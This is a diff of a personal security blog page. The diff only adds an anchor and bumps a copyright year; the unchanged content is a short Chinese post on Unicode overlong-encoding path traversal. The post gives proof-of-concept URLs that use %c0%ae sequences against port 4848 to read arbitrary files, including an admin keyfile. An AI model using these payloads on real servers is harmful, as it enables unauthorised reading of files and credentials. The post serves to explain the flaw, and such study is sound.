@@ -116,6 +116,8 @@
       <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-text">#POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方法"><span class="toc-text">#修复方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网站"><span class="toc-text">#网站</span></a></li></ol>
     </div>
   </div><div class="post-content"><p>#实质<br>unicode编码缺陷导致同一代码的多重含义，导致操作系统对代码的错误解析。典型案例：%c0%ae会被识别为./<br>参考：<a href="https://www.owasp.org/index.php/Canonicalization,_locale_and_Unicode#Description" target="_blank" rel="noopener">https://www.owasp.org/index.php/Canonicalization,_locale_and_Unicode#Description</a></p>
+<a id="more"></a>
+
 <h3 id="POC"><a href="#POC" class="headerlink" title="#POC"></a>#POC</h3><p><code>…/%c0%ae%c0%ae/%c0%ae%c0%ae/……</code><br>可以用来读取任意文件<br>某漏洞点：<br>构造 <a href="http://xxx.xx.xxx.xxx:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/" target="_blank" rel="noopener">http://xxx.xx.xxx.xxx:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</a></p>
 <p>再访问 <a href="http://xxx.xx.xxx.xxx:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/Users/Administrator/Desktop/setup.nsi" target="_blank" rel="noopener">http://xxx.xx.xxx.xxx:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/Users/Administrator/Desktop/setup.nsi</a></p>
 <p>其余案例：<br><a href="http://192.168.147.148:4848/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile" target="_blank" rel="noopener">http://192.168.147.148:4848/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile</a></p>
@@ -157,7 +159,7 @@
     <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
   </span>
 
-  <span class="copyright-year">&copy;2015 - 2020<span class="heart">
+  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
       <i class="iconfont icon-heart"></i>
     </span>
     <span class="author">Salt</span>
